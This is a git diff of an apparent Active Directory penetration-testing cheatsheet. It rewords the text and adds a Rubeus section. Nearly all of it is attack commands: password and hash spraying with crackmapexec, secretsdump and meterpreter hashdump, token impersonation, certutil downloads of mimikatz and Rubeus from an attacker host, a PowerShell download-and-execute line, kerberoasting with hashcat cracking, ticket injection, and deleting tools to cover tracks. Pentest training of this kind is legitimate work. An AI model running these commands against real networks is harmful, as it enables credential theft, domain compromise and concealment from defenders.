@@ -6,7 +6,7 @@ Any use of the information available in this repository for attacking targets wi
 The author(s) is/are not responsible for any misuse of this content.
 
 ### Assume Variables
-Lets assume that the Domain Controller IP is `10.10.10.1/24` and we managed to capture one of the domain users from LLMNR poisoning is `fcastle`
+Let's assume that the Domain Controller IP is `10.10.10.1/24` and we managed to capture one of the domain users from LLMNR poisoning is `fcastle`
 
 ## Table of Contents
 1. [Reconnaissance](#reconnaissance)
@@ -31,25 +31,25 @@ Lets assume that the Domain Controller IP is `10.10.10.1/24` and we managed to c
 ---
 
 ## Reconnaissance
-### 1. If you have access to the internal network on premise try using an ARP sweep
+### 1. If we have access to the internal network on premise try using an ARP sweep
 ```sh
 netdiscover -r 10.10.10.0/24
 ```
-### 2. If you are accessing the internal network using a VPN use nmap instead
+### 2. If we are accessing the internal network using a VPN use nmap instead
  I usually do this scan as it scans the services and the versions of each open ports, but it could take longer than a regular SYN scan. So try doing something else while it's running.
 ```sh
-nmap -T4 -p- -sC -sC 10.10.10.0/24
+nmap -T4 -p- -sC -sV 10.10.10.0/24
 ```
 
-### 3. If you found a port serving a website and is redirecting you to a domain you can use the following command to add the domain
+### 3. If we found a port serving a website and is redirecting we to a domain we can use the following command to add the domain
 ```sh
 sudo nano /etc/hosts
 
-#I.E 10.10.10.1 test.local
+#E.G 10.10.10.1 test.local
 <TARGET_IP> <SLD.TLD> 
 ```
 
-### 3. If you found a HTTP port serving a website you can use the following commands to enumerate
+### 4. If we found a HTTP port serving a website we can use the following commands to enumerate
 ```sh
 #Enumerate directories
 gobuster dir -u http://something.local -w /SecLists/Discovery/Web-Content/raft-small-directories.txt
@@ -237,7 +237,7 @@ This step is crucial as it will save a lot of your time in your pentest engageme
 crackmapexec smb 10.10.10.0/24 -d test.local -u fcastle -p Password1
 ```
 
-### 2. Spray hashes(if you have them) instead of passwords
+### 2. Spray hashes(if we have them) instead of passwords
 ```sh
 crackmapexec smb 10.10.10.0/24 -d test.local -u administrator -H [HASH]
 ```
@@ -275,7 +275,7 @@ gpp-decrypt <PASSWORD>
 ---
 
 ## Pass the Password/ Pass the Hash
-If you have credentials that have local admin privileges on one of the machines, you can dump hashes and secrets available on the compromised machine
+If we have credentials that have local admin privileges on one of the machines, we can dump hashes and secrets available on the compromised machine
 
 ### Pass the Password using secretsdump.py
 ```sh
@@ -299,57 +299,30 @@ run
 
 ## Local Privilege Escalation
 
-### After getting a meterpreter shell, try the following command to see who you are in the machine
-```sh
-getuid
-```
-### If it returns `NT AUTHORITY` you can run anything in that machine without doing anything
-You can run the command below to see all hashes stored in the machine
-```sh
-hashdump
-```
-### But if you are a user other `NT AUTHORITY` than you may or may not be able to do a hashdump, thus you need to check for token impersonations 
-
-In this case, we will be using a module from Metasploit called `Incognito` which will allow us to impersonate as other users in that machine! but be sure to use `getprivs` to see if your account is allowed to impersonate as other users!
-```sh
-getprivs
-```
-If you see something like ImpersonateTokenPrivilege you may continue to the commands below
-```sh
-load incognito
-list_tokens -u
-```
-If you see anything under the Delegation Tokens Available header you can impersonate that user!
-```sh
-impersonate_token "NT AUTHORITY"
-```
-
-## Local Privilege Escalation
-
-### After getting a meterpreter shell, try the following command to see who you are in the machine
+### After getting a meterpreter shell, try the following command to see who we are in the machine
 ```sh
 getuid
 
 #Also run this following command to see the architecture of the host machine! We will assume that this returns a Windows X64 architecture!
 getsystem
 ```
-### If it returns `NT AUTHORITY` you can run anything in that machine without doing anything
+### If it returns `NT AUTHORITY` we can run anything in that machine without doing anything
 You can run the command below to see all hashes stored in the machine
 ```sh
 hashdump
 ```
-### But if you are a user other `NT AUTHORITY` than you may or may not be able to do a hashdump, thus you need to check for token impersonations 
+### But if we are a user other `NT AUTHORITY` than we may or may not be able to do a hashdump, thus we need to check for token impersonations 
 
 In this case, we will be using a module from Metasploit called `Incognito` which will allow us to impersonate as other users in that machine! but be sure to use `getprivs` to see if your account is allowed to impersonate as other users!
 ```sh
 getprivs
 ```
-If you see something like ImpersonateTokenPrivilege you may continue to the commands below
+If we see something like ImpersonateTokenPrivilege we may continue to the commands below
 ```sh
 load incognito
 list_tokens -u
 ```
-If you see anything under the Delegation Tokens Available header you can impersonate that user!
+If we see anything under the Delegation Tokens Available header we can impersonate that user!
 ```sh
 impersonate_token "NT AUTHORITY"
 ```
@@ -358,7 +331,7 @@ impersonate_token "NT AUTHORITY"
 No worries, we can enumerate the local machine using `Winpeas.exe` and `Powerview.ps1`
 
 #### Using WinPEAS for Privilege Escalation Enumeration
-Download `WinPEAS.exe` and execute it to look for misconfigurations and privilege escalation vectors. There could be clear text credentials or encoded passwords in files such as `Groups.xml` or if the system was installed using an unattended installation winpeas will refer you to something like `Unattend.xml`
+Download `WinPEAS.exe` and execute it to look for misconfigurations and privilege escalation vectors. There could be clear text credentials or encoded passwords in files such as `Groups.xml` or if the system was installed using an unattended installation winpeas will refer we to something like `Unattend.xml`
 ```sh
 winpeas.exe > output.txt
 ```
@@ -375,9 +348,9 @@ Get-NetLocalGroupMember -Group "Administrators"
 ## Credential Dumping
 
 ### Dumping Hashes from LSASS
-Your compromised machine most likely dont have `mimikatz.exe` installed because it's not normal for users to have malware in their machine right? Lets try uploading mimikatz to the machine we compromised.
+Your compromised machine most likely dont have `mimikatz.exe` installed because it's not normal for users to have malware in their machine right? Let's try uploading mimikatz to the machine we compromised.
 
-If you havent get `mimikatz` in your Attacker machine yet, you can try going to `@gentilkiwi` mimikatz repository, or you can copy the following link
+If we havent get `mimikatz` in your Attacker machine yet, we can try going to `@gentilkiwi` mimikatz repository, or we can copy the following link
 ```sh
 https://github.com/gentilkiwi/mimikatz
 ```
@@ -391,18 +364,18 @@ After unziping our mimikatz file, we need to run an HTTP server to be able to up
 cd mimikatz_trunk/x64/
 ls 
 ```
-you should be looking at files such as
+we should be looking at files such as
 ```sh
 mimidrv.sys  mimikatz.exe  mimilib.dll  mimispool.dll
 ```
-We will be needing these files for our credential dumpings! so lets run our HTTP Server with either the following commands
+We will be needing these files for our credential dumpings! so let's run our HTTP Server with either the following commands
 ```sh
 python -m SimpleHTTPServer 8000
 
-#Or if you are running python3 use the command below
+#Or if we are running python3 use the command below
 python3 -m http.server 8000
 ```
-If you see the prompt like `serving http server at port 8000` you are ready to download the files, go to the compromised machine and write
+If we see the prompt like `serving http server at port 8000` we are ready to download the files, go to the compromised machine and write
 ```
 certutil -urlcache -f http://<ATTACKER_IP>:8000/mimidrv.sys
 certutil -urlcache -f http://<ATTACKER_IP>:8000/mimikatz.exe
@@ -430,8 +403,77 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<
 
 ---
 
+## Rubeus Kerberos Attacks
+`Rubeus.exe` is a powerful tool for manipulating Kerberos tickets, performing attacks like Pass-the-Ticket (PTT), Overpass-the-Hash, Kerberoasting, and more.
+
+### 1. Uploading Rubeus.exe to the target machine
+Just like the step for `mimikatz.exe` we will be utilizing python simple http server to upload Rubeus to our compromised machine 
+
+1. Download Rubeus from `@GhostPack` Rubeus repository, or by copying the following line
+```sh
+git clone https://github.com/GhostPack/Rubeus.git
+```
+Then we will start our http server to upload rubeus to our compromised machine
+```sh
+cd /path/to/Rubeus/
+python3 -m http.server 8000
+```
+And on the compromised machine open up cmd and fetch `Rubeus.exe` using the following command
+```sh
+certutil -urlcache -f http://<ATTACKER_IP>:8000/Rubeus.exe Rubeus.exe
+```
+
+### 2. Attack Kerberos using Rubeus
+
+If we're already running as a user with Administrator privileges, run `Rubeus.exe` using the following command to dump all available tickets stored in memory
+```ps1
+Rubeus.exe
+```
+If we obtained a `.kirbi` kerberos ticket, we can inject the ticket to the memory by using the following command
+```ps1
+Rubeus.exe ptt /ticket:<BASE64_TICKET>
+```
+Or we could load multiple tickets from a directory by using the following command
+```ps1
+Rubeus.exe ptt /ticket:C:\Users\Public\admin_ticket.kirbi
+```
+
+### 3. Request a TGT via Overpass-the-Hash
+if we have an NTLM hash of a user, we can request a TGT without needing their clear text password:
+```ps1
+Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /domain:test.local
+```
+Once we obtain the TGT, we can inject it into memory using
+```
+Rubeus.exe ptt /ticket:TGT.kirbi
+```
+
+### 4. Kerberoasting
+We can extract service account hashes for offline cracking using `Rubeus.exe` using the command below
+```ps1
+Rubeus.exe kerberoast
+```
+And we will crack the hash we obtained using hashcat with the following command
+```ps1
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+### 5. Obtain AES Keys (Privileged Access)
+We can extract AES keys for further authentication attacks using `Rubeus.exe` using the following
+```ps1
+Rubeus.exe tgtdeleg
+```
+
+### 6. Clean Up (Optional)
+After using Rubeus, we can cover up our tracks by deleting `Rubeus.exe`
+```ps1
+del Rubeus.exe
+```
+
+---
+
 ## Alternative Access to Compromised Machine using RDP
-If you have local Administrator access to a machine you can enable `RDP` for GUI access if it was disabled prior to compromise, using the Metasploit module `post/windows/manage/enable_rdp`, we will assume we already have a meterpreter shell with Administrator privileges
+If we have local Administrator access to a machine we can enable `RDP` for GUI access if it was disabled prior to compromise, using the Metasploit module `post/windows/manage/enable_rdp`, we will assume we already have a meterpreter shell with Administrator privileges
 
 ```sh
 msfconsole
@@ -492,9 +534,14 @@ impacket-psexec test.local/Administrator@10.10.10.2 -k -no-pass
 
 ---
 
+## References
+https://www.offsec.com/metasploit-unleashed/fun-incognito/
+https://github.com/GhostPack/Rubeus
+
+
 ## Final Notes
 - **Always verify attack prerequisites** (e.g., SMB signing, LLMNR/NBT-NS status)
 - **Check for privilege escalation paths** in BloodHound
 - **Monitor logs for detection & evasion techniques**
 
-**Hope you enjoyed this simple cheatsheet!**
+**Stay Ethical and Hope you enjoyed this simple cheatsheet!**
